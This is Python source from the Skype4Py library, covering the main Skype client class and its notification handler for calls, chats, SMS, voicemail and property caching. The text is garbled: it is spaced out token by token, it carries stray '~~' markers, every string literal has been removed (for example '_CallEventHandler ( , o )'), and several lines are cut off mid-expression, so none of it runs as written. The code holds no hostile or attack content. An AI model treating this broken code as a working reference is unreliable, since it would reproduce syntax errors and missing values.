~~ def attachment_changed ( self , status ) : \n 
~~~ try : \n 
~~~ self . skype . _CallEventHandler ( , status ) \n 
if status == apiAttachRefused : \n 
~~~ raise SkypeAPIError ( ) \n 
~~ ~~ except weakref . ReferenceError : \n 
~~~ pass \n 
\n 
~~ ~~ def notification_received ( self , notification ) : \n 
~~~ try : \n 
~~~ skype = self . skype \n 
skype . _CallEventHandler ( , notification ) \n 
a , b = chop ( notification ) \n 
object_type = None \n 
# if..elif handling cache and most event handlers \n 
if a in ( , , , , , , , ~~~ object_type , object_id , prop_name , value = [ a ] + chop ( b , 2 ) \n 
skype . _CacheDict [ str ( object_type ) , str ( object_id ) , str ( prop_name ) ] = value \n 
if object_type == : \n 
~~~ o = User ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == or prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , value ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = Call ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ( value == ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ( value == ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = Chat ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , UserCollection ( skype , split ~~ if prop_name in ( , ) : \n 
~~~ skype . _CallEventHandler ( , o , ( prop_name == ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = ChatMember ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = ChatMessage ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = Application ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , UserCollection ( skype , split ~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ApplicationStreamCollection ~~ elif prop_name == : \n 
~~~ handle , text = chop ( value ) \n 
skype . _CallEventHandler ( , o , ApplicationStream ( o , handle ~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ApplicationStreamCollection ~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ApplicationStreamCollection ~~ ~~ elif object_type == : \n 
~~~ o = Group ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ( value == ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , ( value == ) ) \n 
~~ elif prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , int ( value ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = SmsMessage ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ elif prop_name == : \n 
~~~ for t in split ( value , ) : \n 
~~~ number , status = t . split ( ) \n 
skype . _CallEventHandler ( , SmsTarget ( o , number ) , ~~ ~~ ~~ elif object_type == : \n 
~~~ o = FileTransfer ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ ~~ elif object_type == : \n 
~~~ o = Voicemail ( skype , object_id ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , o , str ( value ) ) \n 
~~ ~~ ~~ elif a in ( , ) : \n 
~~~ object_type , object_id , prop_name , value = [ a , ] + chop ( b ) \n 
skype . _CacheDict [ str ( object_type ) , str ( object_id ) , str ( prop_name ) ] = value \n 
~~ elif a in ( , , , , ~~~ object_type , object_id , prop_name , value = [ a , , , b ] \n 
skype . _CacheDict [ str ( object_type ) , str ( object_id ) , str ( prop_name ) ] = value \n 
if object_type == : \n 
~~~ skype . _CallEventHandler ( , value == ) \n 
~~ elif object_type == : \n 
~~~ skype . _CallEventHandler ( , str ( value ) ) \n 
~~ elif object_type == : \n 
~~~ skype . _CallEventHandler ( , str ( value ) ) \n 
~~ elif object_type == : \n 
~~~ skype . _CallEventHandler ( , ( value == ) ) \n 
~~ elif object_type == : \n 
~~~ skype . _CallEventHandler ( , str ( value ) ) \n 
~~ elif object_type == : \n 
~~~ skype . _CallEventHandler ( , ( value == ) ) \n 
~~ ~~ elif a == : \n 
~~~ skype . _CallEventHandler ( ) \n 
~~ elif a == : \n 
~~~ skype . _CallEventHandler ( , ) # XXX: Arg is Skypename, which one? \n 
~~ elif a == : \n 
~~~ prop_name , value = chop ( b ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , str ( value ) ) \n 
~~ ~~ elif a == : \n 
~~~ prop_name , value = chop ( b ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , int ( value ) ) \n 
~~ ~~ elif a == : \n 
~~~ object_id , prop_name , value = chop ( b , 2 ) \n 
if prop_name == : \n 
~~~ skype . _CallEventHandler ( , PluginEvent ( skype , object_id ) ) \n 
~~ ~~ elif a == : \n 
~~~ object_id , prop_name , value = chop ( b , 2 ) \n 
if prop_name == : \n 
~~~ i = value . rfind ( ) \n 
if i >= 0 : \n 
~~~ context = chop ( value [ i + 8 : ] ) [ 0 ] \n 
users = ( ) \n 
context_id = \n 
if context in ( pluginContextContact , pluginContextCall , pluginContextChat ) : \n 
~~~ users = UserCollection ( skype , split ( value [ : i - 1 ] , ) ) \n 
~~ if context in ( pluginContextCall , pluginContextChat ) : \n 
~~~ j = value . rfind ( ) \n 
if j >= 0 : \n 
~~~ context_id = str ( chop ( value [ j + 11 : ] ) [ 0 ] ) \n 
if context == pluginContextCall : \n 
~~~ context_id = int ( context_id ) \n 
~~ ~~ ~~ skype . _CallEventHandler ( , PluginMenuItem ( skype , object_id ~~ ~~ ~~ elif a == : \n 
~~~ skype . _CallEventHandler ( , unicode2path ( b ) ) \n 
~~ ~~ except weakref . ReferenceError : \n 
~~~ pass \n 
\n 
~~ ~~ def sending_command ( self , command ) : \n 
~~~ try : \n 
~~~ self . skype . _CallEventHandler ( , command ) \n 
~~ except weakref . ReferenceError : \n 
~~~ pass \n 
\n 
~~ ~~ def reply_received ( self , command ) : \n 
~~~ try : \n 
~~~ self . skype . _CallEventHandler ( , command ) \n 
~~ except weakref . ReferenceError : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ ~~ class Skype ( EventHandlingBase ) : \n 
~~~ """The main class which you have to instantiate to get access to the Skype client\n    running currently in the background.\n\n    Usage\n    =====\n\n       You should access this class using the alias at the package level:\n\n       .. python::\n\n           import Skype4Py\n\n           skype = Skype4Py.Skype()\n\n       Read the constructor (`Skype.__init__`) documentation for a list of accepted\n       arguments.\n\n    Events\n    ======\n\n       This class provides events.\n\n       The events names and their arguments lists can be found in the `SkypeEvents`\n       class in this module.\n\n       The use of events is explained in the `EventHandlingBase` class\n       which is a superclass of this class.\n    """ \n 
\n 
def __init__ ( self , Events = None , ** Options ) : \n 
~~~ """Initializes the object.\n\n        :Parameters:\n          Events\n            An optional object with event handlers. See `Skype4Py.utils.EventHandlingBase`\n            for more information on events.\n          Options\n            Additional options for low-level API handler. See the `Skype4Py.api`\n            subpackage for supported options. Available options may depend on the\n            current platform. Note that the current platform can be queried using\n            `Skype4Py.platform` variable.\n        """ \n 
self . _Logger = logging . getLogger ( ) \n 
self . _Logger . info ( ) \n 
\n 
EventHandlingBase . __init__ ( self ) \n 
if Events : \n 
~~~ self . _SetEventHandlerObject ( Events ) \n 
\n 
~~ try : \n 
~~~ self . _Api = Options . pop ( ) \n 
if Options : \n 
~~~ raise TypeError ( ) \n 
~~ ~~ except KeyError : \n 
~~~ self . _Api = SkypeAPI ( Options ) \n 
~~ self . _Api . set_notifier ( APINotifier ( self ) ) \n 
\n 
Cached . _CreateOwner ( self ) \n 
\n 
self . _Cache = True \n 
self . ResetCache ( ) \n 
\n 
from api import DEFAULT_TIMEOUT \n 
self . _Timeout = DEFAULT_TIMEOUT \n 
\n 
self . _Convert = Conversion ( self ) \n 
self . _Client = Client ( self ) \n 
self . _Settings = Settings ( self ) \n 
self . _Profile = Profile ( self ) \n 
\n 
~~ def __del__ ( self ) : \n 
~~~ """Frees all resources.\n        """ \n 
if hasattr ( self , ) : \n 
~~~ self . _Api . close ( ) \n 
\n 
~~ self . _Logger . info ( ) \n 
\n 
~~ def _DoCommand ( self , Cmd , ExpectedReply = ) : \n 
~~~ command = Command ( Cmd , ExpectedReply , True , self . Timeout ) \n 
self . SendCommand ( command ) \n 
a , b = chop ( command . Reply ) \n 
if a == : \n 
~~~ errnum , errstr = chop ( b ) \n 
self . _CallEventHandler ( , command , int ( errnum ) , errstr ) \n 
raise SkypeError ( int ( errnum ) , errstr ) \n 
~~ if not command . Reply . startswith ( command . Expected ) : \n 
~~~ raise SkypeError ( 0 , % ( command . Reply , command . Expected ) ) \n 
~~ return command . Reply \n 
\n 
~~ def _Property ( self , ObjectType , ObjectId , PropName , Set = None , Cache = True ) : \n 
~~~ h = ( str ( ObjectType ) , str ( ObjectId ) , str ( PropName ) ) \n 
arg = ( % h ) . split ( ) \n 
while in arg : \n 
~~~ arg . remove ( ) \n 
~~ jarg = . join ( arg ) \n 
if Set is None : # Get \n 
~~~ if Cache and self . _Cache and h in self . _CacheDict : \n 
~~~ return self . _CacheDict [ h ] \n 
~~ value = self . _DoCommand ( % jarg , jarg ) \n 
while arg : \n 
~~~ try : \n 
~~~ a , b = chop ( value ) \n 
~~ except ValueError : \n 
~~~ break \n 
~~ if a . lower ( ) != arg [ 0 ] . lower ( ) : \n 
~~~ break \n 
~~ del arg [ 0 ] \n 
value = b \n 
~~ if Cache and self . _Cache : \n 
~~~ self . _CacheDict [ h ] = value \n 
~~ return value \n 
~~ else : # Set \n 
~~~ value = unicode ( Set ) \n 
self . _DoCommand ( % ( jarg , value ) , jarg ) \n 
if Cache and self . _Cache : \n 
~~~ self . _CacheDict [ h ] = value \n 
\n 
~~ ~~ ~~ def _Alter ( self , ObjectType , ObjectId , AlterName , Args = None , Reply = None ) : \n 
~~~ cmd = % ( str ( ObjectType ) , str ( ObjectId ) , str ( AlterName ) ) \n 
if Reply is None : \n 
~~~ Reply = cmd \n 
~~ if Args is not None : \n 
~~~ cmd = % ( cmd , tounicode ( Args ) ) \n 
~~ reply = self . _DoCommand ( cmd , Reply ) \n 
arg = cmd . split ( ) \n 
while arg : \n 
~~~ try : \n 
~~~ a , b = chop ( reply ) \n 
~~ except ValueError : \n 
~~~ break \n 
~~ if a . lower ( ) != arg [ 0 ] . lower ( ) : \n 
~~~ break \n 
~~ del arg [ 0 ] \n 
reply = b \n 
~~ return reply \n 
\n 
~~ def _Search ( self , ObjectType , Args = None ) : \n 
~~~ cmd = % ObjectType \n 
if Args is not None : \n 
~~~ cmd = % ( cmd , Args ) \n 
# It is safe to do str() as none of the searchable objects use non-ascii chars. \n 
~~ return split ( chop ( str ( self . _DoCommand ( cmd ) ) ) [ - 1 ] , ) \n 
\n 
~~ def ApiSecurityContextEnabled ( self , Context ) : \n 
~~~ """Queries if an API security context for Internet Explorer is enabled.\n\n        :Parameters:\n          Context : unicode\n            API security context to check.\n\n        :return: True if the API security for the given context is enabled, False otherwise.\n        :rtype: bool\n\n        :warning: This functionality isn\'t supported by Skype4Py.\n        """ \n 
self . _Api . security_context_enabled ( Context ) \n 
\n 
~~ def Application ( self , Name ) : \n 
~~~ """Queries an application object.\n\n        :Parameters:\n          Name : unicode\n            Application name.\n\n        :return: The application object.\n        :rtype: `application.Application`\n        """ \n 
return Application ( self , Name ) \n 
\n 
~~ def _AsyncSearchUsersReplyHandler ( self , Command ) : \n 
~~~ if Command in self . _AsyncSearchUsersCommands : \n 
~~~ self . _AsyncSearchUsersCommands . remove ( Command ) \n 
self . _CallEventHandler ( , Command . Id , \n 
UserCollection ( self , split ( chop ( Command . Reply ) [ - 1 ] , ) ) ) \n 
if len ( self . _AsyncSearchUsersCommands ) == 0 : \n 
~~~ self . UnregisterEventHandler ( , self . _AsyncSearchUsersReplyHandler ) \n 
del self . _AsyncSearchUsersCommands \n 
\n 
~~ ~~ ~~ def AsyncSearchUsers ( self , Target ) : \n 
~~~ """Asynchronously searches for Skype users.\n\n        :Parameters:\n          Target : unicode\n            Search target (name or email address).\n\n        :return: A search identifier. It will be passed along with the results to the\n                 `SkypeEvents.AsyncSearchUsersFinished` event after the search is completed.\n        :rtype: int\n        """ \n 
if not hasattr ( self , ) : \n 
~~~ self . _AsyncSearchUsersCommands = [ ] \n 
self . RegisterEventHandler ( , self . _AsyncSearchUsersReplyHandler ) \n 
~~ command = Command ( % tounicode ( Target ) , , False , self . Timeout ) \n 
self . _AsyncSearchUsersCommands . append ( command ) \n 
self . SendCommand ( command ) \n 
# return pCookie - search identifier \n 
return command . Id \n 
\n 
~~ def Attach ( self , Protocol = 5 , Wait = True ) : \n 
~~~ """Establishes a connection to Skype.\n\n        :Parameters:\n          Protocol : int\n            Minimal Skype protocol version.\n          Wait : bool\n            If set to False, blocks forever until the connection is established. Otherwise, timeouts\n            after the `Timeout`.\n        """ \n 
try : \n 
~~~ self . _Api . protocol = Protocol \n 
self . _Api . attach ( self . Timeout , Wait ) \n 
~~ except SkypeAPIError : \n 
~~~ self . ResetCache ( ) \n 
raise \n 
\n 
~~ ~~ def Call ( self , Id = 0 ) : \n 
~~~ """Queries a call object.\n\n        :Parameters:\n          Id : int\n            Call identifier.\n\n        :return: Call object.\n        :rtype: `call.Call`\n        """ \n 
o = Call ( self , Id ) \n 
o . Status # Test if such a call exists. \n 
return o \n 
\n 
~~ def Calls ( self , Target = ) : \n 
~~~ """Queries calls in call history.\n\n        :Parameters:\n          Target : str\n            Call target.\n\n        :return: Call objects.\n        :rtype: `CallCollection`\n        """ \n 
return CallCollection ( self , self . _Search ( , Target ) ) \n 
\n 
~~ def _ChangeUserStatus_UserStatus ( self , Status ) : \n 
~~~ if Status . upper ( ) == self . _ChangeUserStatus_Status : \n 
~~~ self . _ChangeUserStatus_Event . set ( ) \n 
\n 
~~ ~~ def ChangeUserStatus ( self , Status ) : \n 
~~~ """Changes the online status for the current user.\n\n        :Parameters:\n          Status : `enums`.cus*\n            New online status for the user.\n\n        :note: This function waits until the online status changes. Alternatively, use the\n               `CurrentUserStatus` property to perform an immediate change of status.\n        """ \n 
if self . CurrentUserStatus . upper ( ) == Status . upper ( ) : \n 
~~~ return \n 
~~ self . _ChangeUserStatus_Event = threading . Event ( ) \n 
self . _ChangeUserStatus_Status = Status . upper ( ) \n 
self . RegisterEventHandler ( , self . _ChangeUserStatus_UserStatus ) \n 
self . CurrentUserStatus = Status \n 
self . _ChangeUserStatus_Event . wait ( ) \n 
self . UnregisterEventHandler ( , self . _ChangeUserStatus_UserStatus ) \n 
del self . _ChangeUserStatus_Event , self . _ChangeUserStatus_Status \n 
\n 
~~ def Chat ( self , Name = ) : \n 
~~~ """Queries a chat object.\n\n        :Parameters:\n          Name : str\n            Chat name.\n\n        :return: A chat object.\n        :rtype: `chat.Chat`\n        """ \n 
o = Chat ( self , Name ) \n 
o . Status # Tests if such a chat really exists. \n 
return o \n 
\n 
~~ def ClearCallHistory ( self , Username = , Type = chsAllCalls ) : \n 
~~~ """Clears the call history.\n\n        :Parameters:\n          Username : str\n            Skypename of the user. A special value of \'ALL\' means that entries of all users should\n            be removed.\n          Type : `enums`.clt*\n            Call type.\n        """ \n 
cmd = % ( str ( Type ) , Username ) \n 
self . _DoCommand ( cmd , cmd ) \n 
\n 
~~ def ClearChatHistory ( self ) : \n 
~~~ """Clears the chat history.\n        """ \n 
cmd = \n 
self . _DoCommand ( cmd , cmd ) \n 
\n 
~~ def ClearVoicemailHistory ( self ) : \n 
~~~ """Clears the voicemail history.\n        """ \n 
self . _DoCommand ( ) \n 
\n 
~~ def Command ( self , Command , Reply = , Block = False , Timeout = 30000 , Id = - 1 ) : \n 
~~~ """Creates an API command object.\n\n        :Parameters:\n          Command : unicode\n            Command string.\n          Reply : unicode\n            Expected reply. By default any reply is accepted (except errors which raise an\n            `SkypeError` exception).\n          Block : bool\n            If set to True, `SendCommand` method waits for a response from Skype API before\n            returning.\n          Timeout : float, int or long\n            Timeout. Used if Block == True. Timeout may be expressed in milliseconds if the type\n            is int or long or in seconds (or fractions thereof) if the type is float.\n          Id : int\n            Command Id. The default (-1) means it will be assigned automatically as soon as the\n            command is sent.\n\n        :return: A command object.\n        :rtype: `Command`\n\n        :see: `SendCommand`\n        """ \n 
from api import Command as CommandClass \n 
return CommandClass ( Command , Reply , Block , Timeout , Id ) \n 
\n 
~~ def Conference ( self , Id = 0 ) : \n 
~~~ """Queries a call conference object.\n\n        :Parameters:\n          Id : int\n            Conference Id.\n\n        :return: A conference object.\n        :rtype: `Conference`\n        """ \n 
o = Conference ( self , Id ) \n 
if Id <= 0 or not o . Calls : \n 
~~~ raise SkypeError ( 0 , ) \n 
~~ return o \n 
\n 
~~ def CreateChatUsingBlob ( self , Blob ) : \n 
~~~ """Returns existing or joins a new chat using given blob.\n\n        :Parameters:\n          Blob : str\n            A blob identifying the chat.\n\n        :return: A chat object\n        :rtype: `chat.Chat`\n        """ \n 
return Chat ( self , chop ( self . _DoCommand ( % Blob ) , 2 ) [ 1 ] ) \n 
\n 
~~ def CreateChatWith ( self , * Usernames ) : \n 
~~~ """Creates a chat with one or more users.\n\n        :Parameters:\n          Usernames : str\n            One or more Skypenames of the users.\n\n        :return: A chat object\n        :rtype: `Chat`\n\n        :see: `Chat.AddMembers`\n        """ \n 
return Chat ( self , chop ( self . _DoCommand ( % . join ( Usernames ) ) , 2 ) [ 1 ] ) \n 
\n 
~~ def CreateGroup ( self , GroupName ) : \n 
~~~ """Creates a custom contact group.\n\n        :Parameters:\n          GroupName : unicode\n            Group name.\n\n        :return: A group object.\n        :rtype: `Group`\n\n        :see: `DeleteGroup`\n        """ \n 
groups = self . CustomGroups \n 
self . _DoCommand ( % tounicode ( GroupName ) ) \n 
for g in self . CustomGroups : \n 
~~~ if g not in groups and g . DisplayName == GroupName : \n 
~~~ return g \n 
~~ ~~ raise SkypeError ( 0 , ) \n 
\n 
~~ def CreateSms ( self , MessageType , * TargetNumbers ) : \n 
~~~ """Creates an SMS message.\n\n        :Parameters:\n          MessageType : `enums`.smsMessageType*\n            Message type.\n          TargetNumbers : str\n            One or more target SMS numbers.\n\n        :return: An sms message object.\n        :rtype: `SmsMessage`\n        """ \n 
return SmsMessage ( self , chop ( self . _DoCommand ( % ( MessageType , . join ( TargetNumbers \n 
~~ def DeleteGroup ( self , GroupId ) : \n 
~~~ """Deletes a custom contact group.\n\n        Users in the contact group are moved to the All Contacts (hardwired) contact group.\n\n        :Parameters:\n          GroupId : int\n            Group identifier. Get it from `Group.Id`.\n\n        :see: `CreateGroup`\n        """ \n 
self . _DoCommand ( % GroupId ) \n 
\n 
~~ def EnableApiSecurityContext ( self , Context ) : \n 
~~~ """Enables an API security context for Internet Explorer scripts.\n\n        :Parameters:\n          Context : unicode\n            combination of API security context values.\n\n        :warning: This functionality isn\'t supported by Skype4Py.\n        """ \n 
self . _Api . enable_security_context ( Context ) \n 
\n 
~~ def FindChatUsingBlob ( self , Blob ) : \n 
~~~ """Returns existing chat using given blob.\n\n        :Parameters:\n          Blob : str\n            A blob identifying the chat.\n\n        :return: A chat object\n        :rtype: `chat.Chat`\n        """ \n 
return Chat ( self , chop ( self . _DoCommand ( % Blob ) , 2 ) [ 1 ] ) \n 
\n 
~~ def Greeting ( self , Username = ) : \n 
~~~ """Queries the greeting used as voicemail.\n\n        :Parameters:\n          Username : str\n            Skypename of the user.\n\n        :return: A voicemail object.\n        :rtype: `Voicemail`\n        """ \n 
for v in self . Voicemails : \n 
~~~ if Username and v . PartnerHandle != Username : \n 
~~~ continue \n 
~~ if v . Type in ( vmtDefaultGreeting , vmtCustomGreeting ) : \n 
~~~ return v \n 
\n 
~~ ~~ ~~ def Message ( self , Id = 0 ) : \n 
~~~ """Queries a chat message object.\n\n        :Parameters:\n          Id : int\n            Message Id.\n\n        :return: A chat message object.\n        :rtype: `ChatMessage`\n        """ \n 
o = ChatMessage ( self , Id ) \n 
o . Status # Test if such an id is known. \n 
return o \n 
\n 
~~ def Messages ( self , Target = ) : \n 
~~~ """Queries chat messages which were sent/received by the user.\n\n        :Parameters:\n          Target : str\n            Message sender.\n\n        :return: Chat message objects.\n        :rtype: `ChatMessageCollection`\n        """ \n 
return ChatMessageCollection ( self , self . _Search ( , Target ) ) \n 
\n 
~~ def PlaceCall ( self , * Targets ) : \n 
~~~ """Places a call to a single user or creates a conference call.\n\n        :Parameters:\n          Targets : str\n            One or more call targets. If multiple targets are specified, a conference call is\n            created. The call target can be a Skypename, phone number, or speed dial code.\n\n        :return: A call object.\n        :rtype: `call.Call`\n        """ \n 
calls = self . ActiveCalls \n 
reply = self . _DoCommand ( % . join ( Targets ) ) \n 
# Skype for Windows returns the call status which gives us the call Id; \n 
if reply . startswith ( ) : \n 
~~~ return Call ( self , chop ( reply , 2 ) [ 1 ] ) \n 
\n 
# list of active calls. \n 
~~ for c in self . ActiveCalls : \n 
~~~ if c not in calls : \n 
~~~ return c \n 
~~ ~~ raise SkypeError ( 0 , ) \n 
\n 
~~ def Privilege ( self , Name ) : \n 
~~~ """Queries the Skype services (privileges) enabled for the Skype client.\n\n        :Parameters:\n          Name : str\n            Privilege name, currently one of \'SKYPEOUT\', \'SKYPEIN\', \'VOICEMAIL\'.\n\n        :return: True if the privilege is available, False otherwise.\n        :rtype: bool\n        """ \n 
return ( self . _Property ( , , Name . upper ( ) ) == ) \n 
\n 
~~ def Profile ( self , Property , Set = None ) : \n 
~~~ """Queries/sets user profile properties.\n\n        :Parameters:\n          Property : str\n            Property name, currently one of \'PSTN_BALANCE\', \'PSTN_BALANCE_CURRENCY\', \'FULLNAME\',\n            \'BIRTHDAY\', \'SEX\', \'LANGUAGES\', \'COUNTRY\', \'PROVINCE\', \'CITY\', \'PHONE_HOME\',\n            \'PHONE_OFFICE\', \'PHONE_MOBILE\', \'HOMEPAGE\', \'ABOUT\'.\n          Set : unicode or None\n            Value the property should be set to or None if the value should be queried.\n\n        :return: Property value if Set=None, None otherwise.\n        :rtype: unicode or None\n        """ \n 
return self . _Property ( , , Property , Set ) \n 
\n 
~~ def Property ( self , ObjectType , ObjectId , PropName , Set = None ) : \n 
~~~ """Queries/sets the properties of an object.\n\n        :Parameters:\n          ObjectType : str\n            Object type (\'USER\', \'CALL\', \'CHAT\', \'CHATMESSAGE\', ...).\n          ObjectId : str\n            Object Id, depends on the object type.\n          PropName : str\n            Name of the property to access.\n          Set : unicode or None\n            Value the property should be set to or None if the value should be queried.\n\n        :return: Property value if Set=None, None otherwise.\n        :rtype: unicode or None\n        """ \n 
return self . _Property ( ObjectType , ObjectId , PropName , Set ) \n 
\n 
~~ def ResetCache ( self ) : \n 
~~~ """Deletes all command cache entries.\n\n        This method clears the Skype4Py\'s internal command cache which means that all objects will forget\n        their property values and querying them will trigger a code to get them from Skype client (and\n        cache them again).\n        """ \n 
self . _CacheDict = { } \n 
\n 
~~ def SearchForUsers ( self , Target ) : \n 
~~~ """Searches for users.\n\n        :Parameters:\n          Target : unicode\n            Search target (name or email address).\n\n        :return: Found users.\n        :rtype: `UserCollection`\n        """ \n 
return UserCollection ( self , self . _Search ( , tounicode ( Target ) ) ) \n 
\n 
~~ def SendCommand ( self , Command ) : \n 
~~~ """Sends an API command.\n\n        :Parameters:\n          Command : `Command`\n            Command to send. Use `Command` method to create a command.\n        """ \n 
try : \n 
~~~ self . _Api . send_command ( Command ) \n 
~~ except SkypeAPIError : \n 
~~~ self . ResetCache ( ) \n 
raise \n 
\n 
~~ ~~ def SendMessage ( self , Username , Text ) : \n 
~~~ """Sends a chat message.\n\n        :Parameters:\n          Username : str\n            Skypename of the user.\n          Text : unicode\n            Body of the message.\n\n        :return: A chat message object.\n        :rtype: `ChatMessage`\n        """ \n 
return self . CreateChatWith ( Username ) . SendMessage ( Text ) \n 
\n 
~~ def SendSms ( self , * TargetNumbers , ** Properties ) : \n 
~~~ """Creates and sends an SMS message.\n\n        :Parameters:\n          TargetNumbers : str\n            One or more target SMS numbers.\n          Properties\n            Message properties. Properties available are same as `SmsMessage` object properties.\n\n        :return: An sms message object. The message is already sent at this point.\n        :rtype: `SmsMessage`\n        """ \n 
sms = self . CreateSms ( smsMessageTypeOutgoing , * TargetNumbers ) \n 
for name , value in Properties . items ( ) : \n 
~~~ if isinstance ( getattr ( sms . __class__ , name , None ) , property ) : \n 
~~~ setattr ( sms , name , value ) \n 
~~ else : \n 
~~~ raise TypeError ( % prop ) \n 
~~ ~~ sms . Send ( ) \n 
return sms \n 
\n 
~~ def SendVoicemail ( self , Username ) : \n 
~~~ """Sends a voicemail to a specified user.\n\n        :Parameters:\n          Username : str\n            Skypename of the user.\n\n        :note: Should return a `Voicemail` object. This is not implemented yet.\n        """ \n 
if self . _Api . protocol >= 6 : \n 
~~~ self . _DoCommand ( % Username ) \n 
~~ else : \n 
~~~ self . _DoCommand ( % Username ) \n 
\n 
~~ ~~ def User ( self , Username = ) : \n 
~~~ """Queries a user object.\n\n        :Parameters:\n          Username : str\n            Skypename of the user.\n\n        :return: A user object.\n        :rtype: `user.User`\n        """ \n 
if not Username : \n 
~~~ Username = self . CurrentUserHandle \n 
~~ o = User ( self , Username ) \n 
o . OnlineStatus # Test if such a user exists. \n 
return o \n 
\n 
~~ def Variable ( self , Name , Set = None ) : \n 
~~~ """Queries/sets Skype general parameters.\n\n        :Parameters:\n          Name : str\n            Variable name.\n          Set : unicode or None\n            Value the variable should be set to or None if the value should be queried.\n\n        :return: Variable value if Set=None, None otherwise.\n        :rtype: unicode or None\n        """ \n 
return self . _Property ( Name , , , Set ) \n 
\n 
~~ def Voicemail ( self , Id ) : \n 
~~~ """Queries the voicemail object.\n\n        :Parameters:\n          Id : int\n            Voicemail Id.\n\n        :return: A voicemail object.\n        :rtype: `Voicemail`\n        """ \n 
o = Voicemail ( self , Id ) \n 
o . Type # Test if such a voicemail exists. \n 
return o \n 
\n 
~~ def _GetActiveCalls ( self ) : \n 
~~~ return CallCollection ( self , self . _Search ( ) ) \n 
\n 
~~ ActiveCalls = property ( _GetActiveCalls , \n 
doc = """Queries a list of active calls.\n\n    :type: `CallCollection`\n    """ ) \n 
\n 
def _GetActiveChats ( self ) : \n 
~~~ return ChatCollection ( self , self . _Search ( ) ) \n 
\n 
~~ ActiveChats = property ( _GetActiveChats , \n 
doc = """Queries a list of active chats.\n\n    :type: `ChatCollection`\n    """ ) \n 
\n 
def _GetActiveFileTransfers ( self ) : \n 
~~~ return FileTransferCollection ( self , self . _Search ( ) ) \n 
\n 
~~ ActiveFileTransfers = property ( _GetActiveFileTransfers , \n 
doc = """Queries currently active file transfers.\n\n    :type: `FileTransferCollection`\n    """ ) \n 
\n 
def _GetApiWrapperVersion ( self ) : \n 
~~~ import pkg_resources \n 
return pkg_resources . get_distribution ( "Skype4Py" ) . version \n 
\n 
~~ ApiWrapperVersion = property ( _GetApiWrapperVersion , \n 
doc = """Returns Skype4Py version.\n\n    :type: str\n    """ ) \n 
\n 
def _GetAttachmentStatus ( self ) : \n 
~~~ return self . _Api . attachment_status \n 
\n 
~~ AttachmentStatus = property ( _GetAttachmentStatus , \n 
doc = """Queries the attachment status of the Skype client.\n\n    :type: `enums`.apiAttach*\n    """ ) \n 
\n 
def _GetBookmarkedChats ( self ) : \n 
~~~ return ChatCollection ( self , self . _Search ( ) ) \n 
\n 
~~ BookmarkedChats = property ( _GetBookmarkedChats , \n 
doc = """Queries a list of bookmarked chats.\n\n    :type: `ChatCollection`\n    """ ) \n 
\n 
def _GetCache ( self ) : \n 
~~~ return self . _Cache \n 
\n 
~~ def _SetCache ( self , Value ) : \n 
~~~ self . _Cache = bool ( Value ) \n 
\n 
~~ Cache = property ( _GetCache , _SetCache , \n 
doc = """Queries/sets the status of internal cache. The internal API cache is used\n    to cache Skype object properties and global parameters.\n\n    :type: bool\n    """ ) \n 
\n 
def _GetChats ( self ) : \n 
~~~ return ChatCollection ( self , self . _Search ( ) ) \n 
\n 
~~ Chats = property ( _GetChats , \n 
doc = """Queries a list of chats.\n\n    :type: `ChatCollection`\n    """ ) \n 
\n 
def _GetClient ( self ) : \n 
~~~ return self . _Client \n 
\n 
~~ Client = property ( _GetClient , \n 
doc = """Queries the user interface control object.\n\n    :type: `Client`\n    """ ) \n 
\n 
def _GetCommandId ( self ) : \n 
~~~ return True \n 
\n 
~~ def _SetCommandId ( self , Value ) : \n 
~~~ if not Value : \n 
~~~ raise SkypeError ( 0 , ) \n 
\n 
~~ ~~ CommandId = property ( _GetCommandId , _SetCommandId , \n 
doc = """Queries/sets the status of automatic command identifiers.\n\n    :type: bool\n\n    :note: Currently the only supported value is True.\n    """ ) \n 
\n 
def _GetConferences ( self ) : \n 
~~~ cids = [ ] \n 
for c in self . Calls ( ) : \n 
~~~ cid = c . ConferenceId \n 
if cid > 0 and cid not in cids : \n 
~~~ cids . append ( cid ) \n 
~~ ~~ return ConferenceCollection ( self , cids ) \n 
\n 
